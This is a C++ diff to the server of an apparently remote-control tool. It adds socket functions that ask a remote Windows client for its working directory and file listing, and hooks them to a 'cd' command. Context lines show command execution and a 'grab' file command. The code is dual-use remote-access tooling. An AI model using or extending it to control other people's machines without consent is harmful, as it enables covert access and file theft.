@@ -35,6 +35,106 @@ private:
     std::string currentDir = "";
     std::vector<fileBrowserEntry> currentDirFiles;
 
+    void fileBrowserGetWorkingDir(){
+        this->servLogWin->add("connection::fileBrowserGetWorkingDir() - INFO: Called");
+        this->sockFdMutex.lock();
+        
+        int bytesSent = send(this->sockFd, "filebrowser;gwd;", 16, 0);
+        if(bytesSent < 0){
+            this->servLogWin->add("connection::fileBrowserGetWorkingDir() - ERR: send() returned " + std::to_string(bytesSent) + " | " + strerror(errno));
+            this->plainTextMessageHistory.push_back("Error: send() returned " + std::to_string(bytesSent) + " | " + strerror(errno));
+            this->sockFdMutex.unlock();
+            return;
+        }
+
+        // Read the response from the client
+        char buffer[512] = {0}; // 512 is easily enough for a windows path
+        int bytesReceived = recv(this->sockFd, buffer, 512, 0);
+        if(bytesReceived < 0){
+            this->servLogWin->add("connection::fileBrowserGetWorkingDir() - ERR: recv() returned " + std::to_string(bytesReceived) + " | " + strerror(errno));
+            this->plainTextMessageHistory.push_back("Error: recv() returned " + std::to_string(bytesReceived) + " | " + strerror(errno));
+            this->sockFdMutex.unlock();
+            return;
+        }
+
+        // Parse the response
+        // FORMAT: "filebrowser;gwd;[path];"
+        std::string response = std::string(buffer);
+        if(response.length() < 16){
+            this->servLogWin->add("connection::fileBrowserGetWorkingDir() - ERR: Response too short");
+            this->plainTextMessageHistory.push_back("Error: Response too short");
+            this->sockFdMutex.unlock();
+            return;
+        }
+        this->currentDir = response.substr(16, response.length() - 17); // Remove the "filebrowser;gwd;" and the ";" at the end
+    
+        // For debug, print to log
+        this->servLogWin->add("connection::fileBrowserGetWorkingDir() - INFO: Current working directory: " + this->currentDir);
+        this->sockFdMutex.unlock();
+    }
+
+    /*
+        Updates the currentDirFiles vector with the contents of the client's current working directory
+    */
+    void fileBrowserUpdate(){
+        this->servLogWin->add("connection::fileBrowserUpdate() - INFO: Called");
+        this->sockFdMutex.lock();
+
+        int bytesSent = send(this->sockFd, "filebrowser;ls;", 15, 0);
+        if(bytesSent < 0){
+            this->servLogWin->add("connection::fileBrowserGetWorkingDir() - ERR: send() returned " + std::to_string(bytesSent) + " | " + strerror(errno));
+            this->plainTextMessageHistory.push_back("Error: send() returned " + std::to_string(bytesSent) + " | " + strerror(errno));
+            this->sockFdMutex.unlock();
+            return;
+        }
+
+        // Receive the first 4096 bytes of the response
+        // The format of the response is:
+        // filebrowser;ls;[response length];[response];
+        // where [response] looks like: 0[filename];1[filename];
+        // where 0 and 1 indicate whether or not the file is a directory
+        this->servLogWin->add("connection::fileBrowserUpdate() - INFO: Receiving first 4096 bytes of response from client...");
+        char buffer[4096] = {0};
+        int bytesReceived = recv(this->sockFd, buffer, 4096, 0);
+        if(bytesReceived < 0){
+            this->servLogWin->add("connection::fileBrowserUpdate() - ERR: recv() returned " + std::to_string(bytesReceived) + " | " + strerror(errno));
+            this->plainTextMessageHistory.push_back("Error: recv() returned " + std::to_string(bytesReceived) + " | " + strerror(errno));
+            this->sockFdMutex.unlock();
+            return;
+        }
+
+        // Parse the response to get the size of the response
+        std::string responseString = std::string(buffer);
+        unsigned int responseSize = 0;
+        try{
+            responseSize = std::stoi(responseString.substr(15, responseString.find(";", 15) - 15));
+        }catch(...){
+            this->servLogWin->add("connection::fileBrowserUpdate() - ERR: std::stoi failed, client sent invalid response");
+            this->plainTextMessageHistory.push_back("Error: std::stoi failed, client sent invalid response");
+            this->sockFdMutex.unlock();
+            return;
+        }
+        this->servLogWin->add("connection::fileBrowserUpdate() - INFO: Response size: " + std::to_string(responseSize));
+
+        // Receive the rest of the response
+        unsigned int bytesReceivedTotal = bytesReceived;
+        while(bytesReceivedTotal < responseSize){
+            bytesReceived = recv(this->sockFd, buffer, 4096, 0);
+            if(bytesReceived < 0){
+                this->servLogWin->add("connection::fileBrowserUpdate() - ERR: recv() returned " + std::to_string(bytesReceived) + " | " + strerror(errno));
+                this->plainTextMessageHistory.push_back("Error: recv() returned " + std::to_string(bytesReceived) + " | " + strerror(errno));
+                this->sockFdMutex.unlock();
+                return;
+            }
+            bytesReceivedTotal += bytesReceived;
+        }
+
+        // Parse the response
+        // For debug, just print it to the log
+        this->servLogWin->add("connection::fileBrowserUpdate() - INFO: Response: " + std::string(buffer));
+        this->sockFdMutex.unlock();
+    }
+
 
     /*
         Reads all the data from the socket (flushes the socket)
@@ -83,6 +183,8 @@ private:
         // Special commands that require their own special function:
         else if(cmd.starts_with("cd ")){ // cd cant be handled by exec() becase _popen cant change the working directory of the client executable
             this->genericCmd("cd;" + cmd.substr(3) + ";");
+            this->fileBrowserGetWorkingDir();
+            this->fileBrowserUpdate();
         }
         else if(cmd.starts_with("grab ")){
             this->grab(cmd.substr(5));
@@ -467,11 +569,11 @@ public:
     }
 
     /*
-        Draws the file browser window, also updates its contents
+        Draws the file browser window
         Consists of a list of the current directory's files/folders and a button to go up a directory
         The list of files/folders is scrollable
     */
-    void drawUpdateFileBrowser(float wStartXNorm,
+    void drawFileBrowser(float wStartXNorm,
                                float wStartYNorm,
                                float wEndXNorm,
                                float wEndYNorm,
